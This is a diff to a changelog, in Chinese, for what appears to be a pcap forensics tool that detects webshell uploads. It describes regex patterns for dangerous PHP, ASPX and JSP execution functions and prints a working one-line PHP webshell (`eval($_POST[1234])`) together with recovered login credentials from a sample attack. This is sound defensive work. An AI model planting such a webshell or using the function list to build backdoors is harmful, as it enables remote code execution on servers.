@@ -220,6 +220,37 @@
   - **攻击链完整**: v0.4.2 找到的 `admin/admin!@#pass123` (16:03 登录成功) → v0.5.0 找到的 `1.php` 上传 (16:12, 9 分钟后) → 攻击者登录后台后立即上传 webshell
 - **运行命令**: `python src/analyze.py --pcap examples/web_attack.pcap -m webshell`
 
+### Added (webshell-analyze) — v0.5.1 webshell 内容解析 (代码层面密码识别)
+- **`parser.py`** — 新文件, webshell body 内容解析:
+  - **核心洞察**: 密码不是从 URL 参数找的 (攻击者可能没访问过上传后的 webshell), 而是从**上传 body 里的代码** 推出来的 — `eval($_POST['pass'])` / `assert($_POST['x'])` / `system($_GET['cmd'])` 等
+  - 主流 webshell 函数字典 (20 个): `eval / assert / system / exec / passthru / shell_exec / popen / proc_open / pcntl_exec / preg_replace / create_function / array_map / array_filter / call_user_func / call_user_func_array / file_put_contents / fwrite / include / require`
+  - 正则模式覆盖:
+    - **PHP exec**: `eval/assert/system/exec/passthru/shell_exec/popen/proc_open/pcntl_exec` + `$_POST/$_GET/$_REQUEST/$_SERVER/$_COOKIE/$_FILES/$_ENV`
+    - **PHP 高阶**: `call_user_func/array_map/array_filter/create_function` + `$_POST`
+    - **PHP 混淆**: `eval(base64_decode/str_rot13/gzuncompress/hex2bin/gzinflate` + `$_POST`
+    - **PHP 写入**: `file_put_contents/fwrite` + `$_POST`
+    - **ASPX**: `eval(Request["xxx"]) / eval(Request.Item["xxx"]) / eval(Request.QueryString["xxx"]) / eval(Request.Form["xxx"])`
+    - **JSP**: `request.getParameter("xxx") / request.getParameterValues("xxx")`
+  - 引号/无引号/数字键全兼容: `$_POST['pass']` / `$_POST["pass"]` / `$_POST[pass]` / `$_POST[1234]` 都识别
+- **`extract_webshell_from_multipart_body(body)`** — 从 multipart body 里抽**文件 part** (其他 form field 跳过), 自动调 detect_webshell_functions
+- **`detect_upload` 集成**: 自动调 parser, 返回值新增 `functions / passwords / language` 字段
+- **`aggregator` 透传**: link_uploads_to_accesses 把 `code_functions / code_passwords / language` 合并到 linked 记录
+- **`report.py` 增强**: 关键结论段加"语言 / webshell 函数 / 代码提取的密码" 三行, 直接告诉用户上传了什么 + 怎么用
+- 23 个 parser 单测 (PHP×12 + ASPX×3 + JSP×2 + 边界×3 + multipart×3)
+
+### 端到端 web_attack.pcap 验证 (v0.5.1) — 三问全答案
+- **1.php** (2018-08-08 16:12:49, 192.168.94.59 上传到 `/admin/article.php?rec=update`)
+  - **语言**: php
+  - **webshell 函数**: `eval`
+  - **代码提取的密码**: **`1234`** ← v0.5.0 没答的, v0.5.1 答了
+  - body 实际: `<?php @eval($_POST[1234]);?>` ← 一句话 webshell 标准模式
+- **完整攻击链**:
+  ```
+  14:35  伴攻 192.168.94.233  登录成功 (人事/hr123456)                       ← v0.4.2
+  16:03  主攻 192.168.94.59   登录成功 (admin/admin!@#pass123)                ← v0.4.2
+  16:12  主攻  上传 1.php (eval($_POST[1234])) 到 /admin/article.php           ← v0.5.0 + v0.5.1
+  ```
+
 ## [0.1.0] - 2026-06-27
 
 ### Added
